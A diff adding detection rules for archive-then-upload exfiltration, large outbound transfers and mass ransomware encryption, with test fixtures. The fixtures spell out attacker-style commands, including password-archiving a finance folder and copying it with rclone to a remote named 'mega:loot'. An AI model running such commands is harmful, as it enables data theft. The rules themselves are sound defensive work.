@@ -1,0 +1,168 @@
+# Collection, exfiltration and impact correlations (Phase 1).
+# `generate: false` rules are building blocks for the correlations below.
+
+title: Archive created with a command-line archiver
+id: lf-b-archive-created
+name: archive_created
+generate: false
+status: stable
+description: Files packed with 7-Zip, WinRAR, tar, zip or Compress-Archive (building block).
+author: Logforge Security Team
+date: 2026/11/17
+tags: [attack.collection, attack.t1560.001]
+logsource: {category: process_creation}
+detection:
+    selection:
+        command_line|contains:
+            - '7z.exe a '
+            - '7z a '
+            - '7za a '
+            - 'rar.exe a '
+            - 'tar -czf'
+            - 'tar czf'
+            - 'zip -r'
+            - 'Compress-Archive'
+    condition: selection
+fixtures:
+    true_positive: {command_line: '7z.exe a -pS3cret C:\Users\Public\fin.7z C:\Finance', hostname: WS-051}
+    true_negative: {command_line: '7z.exe x C:\Downloads\tools.7z', hostname: WS-051}
+level: low
+---
+title: Upload with a cloud-storage sync tool
+id: lf-b-cloud-upload-tool
+name: cloud_upload_tool
+generate: false
+status: stable
+description: rclone, MEGAcmd or similar copying data to remote storage (building block).
+author: Logforge Security Team
+date: 2026/11/17
+tags: [attack.exfiltration, attack.t1567.002]
+logsource: {category: process_creation}
+detection:
+    selection:
+        command_line|contains:
+            - 'rclone copy'
+            - 'rclone sync'
+            - 'rclone.exe copy'
+            - 'rclone.exe sync'
+            - 'mega-put'
+            - 'megacmd'
+    condition: selection
+fixtures:
+    true_positive: {command_line: 'rclone.exe copy C:\Users\Public\fin.7z mega:loot', hostname: WS-051}
+    true_negative: {command_line: 'rclone.exe version', hostname: WS-051}
+level: low
+---
+title: Archive then upload to cloud storage
+id: lf-c-archive-then-cloud-upload
+status: stable
+description: Data is archived and then uploaded with a cloud-storage tool from the same host within 30 minutes, the usual staging-then-exfiltration pattern.
+author: Logforge Security Team
+date: 2026/11/17
+references: [https://attack.mitre.org/techniques/T1560/001/, https://attack.mitre.org/techniques/T1567/002/]
+tags: [attack.collection, attack.exfiltration, attack.t1560.001, attack.t1567.002]
+falsepositives:
+    - Backup jobs that archive and sync with rclone (add them to an exclusion)
+correlation:
+    type: temporal_ordered
+    rules: [archive_created, cloud_upload_tool]
+    group-by: [hostname]
+    timespan: 30m
+fixtures:
+    true_positive_batch:
+        - {command_line: '7z.exe a -pS3cret C:\Users\Public\fin.7z C:\Finance', hostname: WS-051}
+        - {at: 4m, event: {command_line: 'rclone.exe copy C:\Users\Public\fin.7z mega:loot', hostname: WS-051}}
+    true_negative_batch:
+        - {command_line: 'rclone.exe copy C:\Users\Public\fin.7z mega:loot', hostname: WS-051}
+        - {at: 1m, event: {command_line: '7z.exe a C:\Users\Public\fin.7z C:\Finance', hostname: WS-051}}
+        - {at: 2m, event: {command_line: 'rclone.exe copy C:\x mega:y', hostname: WS-052}}
+        - {at: 3h, event: {command_line: 'rclone.exe copy C:\x mega:y', hostname: WS-051}}
+level: high
+---
+title: Outbound network flow
+id: lf-b-outbound-flow
+name: outbound_flow
+generate: false
+status: stable
+description: A network flow to a non-private destination with bytes sent (building block).
+author: Logforge Security Team
+date: 2026/11/17
+tags: [attack.exfiltration, attack.t1048]
+logsource: {category: network_connection}
+detection:
+    selection:
+        dst_ip|re: '.+'
+        bytes_out|gt: 0
+    filter_internal:
+        dst_ip|startswith: ['10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.', '172.2', '172.30.', '172.31.', '127.']
+    condition: selection and not filter_internal
+fixtures:
+    true_positive: {src_ip: 10.0.1.15, dst_ip: 203.0.113.66, bytes_out: 400000000}
+    true_negative: {src_ip: 10.0.1.15, dst_ip: 10.0.2.20, bytes_out: 400000000}
+level: low
+---
+title: Large outbound transfer from one host
+id: lf-c-outbound-volume
+status: stable
+description: More than 1 GB sent to external destinations by one internal address within an hour.
+author: Logforge Security Team
+date: 2026/11/17
+references: [https://attack.mitre.org/techniques/T1048/]
+tags: [attack.exfiltration, attack.t1048]
+falsepositives:
+    - Off-site backups and large uploads to sanctioned cloud services
+correlation:
+    type: value_sum
+    rules: [outbound_flow]
+    group-by: [src_ip]
+    timespan: 1h
+    condition: {field: bytes_out, gt: 1000000000}
+fixtures:
+    true_positive_batch:
+        - {repeat: 3, every: 5m, event: {src_ip: 10.0.1.15, dst_ip: 203.0.113.66, bytes_out: 400000000}}
+    true_negative_batch:
+        - {repeat: 2, every: 5m, event: {src_ip: 10.0.1.15, dst_ip: 203.0.113.66, bytes_out: 400000000}}
+        - {at: 2h, event: {src_ip: 10.0.1.15, dst_ip: 203.0.113.66, bytes_out: 400000000}}
+        - {repeat: 5, event: {src_ip: 10.0.1.16, dst_ip: 10.0.2.20, bytes_out: 400000000}}
+level: high
+---
+title: File renamed with a ransomware extension
+id: lf-b-file-encrypted
+name: file_encrypted
+generate: false
+status: stable
+description: A file was written with an extension used by ransomware (building block).
+author: Logforge Security Team
+date: 2026/11/17
+tags: [attack.impact, attack.t1486]
+logsource: {category: file_event}
+detection:
+    selection:
+        target_filename|endswith: ['.locked', '.encrypted', '.crypt', '.crypted', '.enc', '.lockbit', '.ryk']
+    condition: selection
+fixtures:
+    true_positive: {target_filename: 'C:\Shares\Finance\q3.xlsx.locked', hostname: FS-01}
+    true_negative: {target_filename: 'C:\Shares\Finance\q3.xlsx', hostname: FS-01}
+level: low
+---
+title: Mass file encryption on one host
+id: lf-c-mass-file-encryption
+status: stable
+description: Twenty or more files rewritten with a ransomware extension on one host within 5 minutes.
+author: Logforge Security Team
+date: 2026/11/17
+references: [https://attack.mitre.org/techniques/T1486/]
+tags: [attack.impact, attack.t1486]
+correlation:
+    type: event_count
+    rules: [file_encrypted]
+    group-by: [hostname]
+    timespan: 5m
+    condition: {gte: 20}
+fixtures:
+    true_positive_batch:
+        - {repeat: 20, event: {target_filename: 'C:\Shares\Finance\doc.xlsx.locked', hostname: FS-01}}
+    true_negative_batch:
+        - {repeat: 19, event: {target_filename: 'C:\Shares\Finance\doc.xlsx.locked', hostname: FS-01}}
+        - {repeat: 20, event: {target_filename: 'C:\Shares\Finance\doc.xlsx', hostname: FS-01}}
+level: critical
